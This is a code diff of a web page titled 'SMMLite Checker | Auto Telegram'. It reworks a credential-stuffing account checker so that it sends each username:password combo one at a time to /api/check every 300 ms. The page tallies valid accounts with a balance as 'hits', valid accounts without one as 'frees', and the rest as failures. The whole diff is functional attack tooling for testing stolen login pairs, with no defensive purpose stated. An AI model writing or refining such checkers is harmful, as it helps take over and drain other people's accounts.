@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>SMMLite Checker | Auto Telegram</title>
   <style>
-    /* আগের CSS একই থাকবে – সংক্ষেপে দিচ্ছি না, আপনার আছে */
     * { box-sizing: border-box; }
     body {
       background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
@@ -212,7 +211,6 @@
   let checked = 0, hits = 0, frees = 0, fails = 0;
   let allResults = new Map();
   let currentFilter = 'all';
-  const BATCH_SIZE = 50;
 
   function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, m => m==='&'?'&amp;':m==='<'?'&lt;':'&gt;'); }
 
@@ -282,20 +280,26 @@
     renderFilteredResults();
   }
 
-  async function processBatch(batch) {
+  async function checkOne(username, password) {
     try {
-      const response = await fetch('/api/check', {
+      const res = await fetch('/api/check', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ combos: batch })
+        body: JSON.stringify({ username, password })
       });
-      const data = await response.json();
-      return data.results || [];
-    } catch (err) {
-      return batch.map(combo => ({ combo, valid: false, hit: false, balance: 0, message: `Error: ${err.message}` }));
+      const json = await res.json();
+      return {
+        valid: json.valid === true,
+        hit: json.hit === true,
+        balance: json.balance || 0,
+        message: json.message || ''
+      };
+    } catch(err) {
+      return { valid: false, hit: false, balance: 0, message: `Error: ${err.message}` };
     }
   }
 
+  // ===== সিরিয়াল রানার (৩০০ms ডিলে) – 10 Minute School স্টাইল =====
   async function runner() {
     if (!active) return;
     if (currentIdx >= combos.length) {
@@ -306,33 +310,20 @@
       return;
     }
 
-    const batch = combos.slice(currentIdx, currentIdx + BATCH_SIZE);
-    const batchCombos = batch.map(c => `${c.username}:${c.password}`);
-    statusMsg.innerText = `🔍 Processing batch ${Math.floor(currentIdx/BATCH_SIZE)+1} (${currentIdx+1}-${Math.min(currentIdx+batch.length, combos.length)}/${combos.length})`;
-
-    const results = await processBatch(batchCombos);
-
-    for (const result of results) {
-      checked++;
-      const combo = result.combo;
-      const [username, password] = combo.split(':');
-      if (result.valid && result.hit) hits++;
-      else if (result.valid && !result.hit) frees++;
-      else fails++;
-      addResult(username, password, {
-        valid: result.valid,
-        hit: result.hit,
-        balance: result.balance || 0,
-        message: result.message || ''
-      });
-    }
-
-    currentIdx += batch.length;
+    const { username, password } = combos[currentIdx];
+    statusMsg.innerText = `🔍 (${currentIdx+1}/${combos.length}) ${username}`;
+    const result = await checkOne(username, password);
+    checked++;
+    if (result.valid && result.hit) hits++;
+    else if (result.valid && !result.hit) frees++;
+    else fails++;
     updateStatsUI();
-    renderFilteredResults();
+    addResult(username, password, result);
+    currentIdx++;
 
     if (active && currentIdx < combos.length) {
-      setTimeout(runner, 500);
+      // ৩০০ms ডিলে – 10 Minute School-এর মতো
+      setTimeout(runner, 300);
     } else if (currentIdx >= combos.length) {
       active = false;
       startBtn.disabled = false;
@@ -363,7 +354,7 @@
     active = true;
     startBtn.disabled = true;
     stopBtn.disabled = false;
-    statusMsg.innerText = `🚀 Checking ${combos.length} accounts in batches...`;
+    statusMsg.innerText = `🚀 Checking ${combos.length} accounts one by one...`;
     runner();
   }
 
